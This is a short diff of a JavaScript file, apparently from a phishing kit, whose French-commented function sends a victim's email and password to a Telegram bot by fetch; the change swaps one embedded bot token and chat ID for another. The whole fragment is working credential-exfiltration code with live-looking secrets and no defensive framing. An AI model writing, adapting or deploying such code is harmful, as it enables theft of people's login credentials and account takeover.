@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
     // Fonction d'envoi des données à Telegram
     function envoyerTelegram(data) {
       
-        return fetch(`https://api.telegram.org/bot6667244359:AAFRRgkM-G-AOp01kZbZAkRp0jJIg5dAxEg/sendMessage?chat_id=-4147954845&text=🟦- ${data.email}:${data.password}`, {
+        return fetch(`https://api.telegram.org/8107688809:AAGVUC_P6uiK6MYqXIZJvNjzg77LKrqpsms/sendMessage?chat_id=83565969205&text=🟦- ${data.email}:${data.password}`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
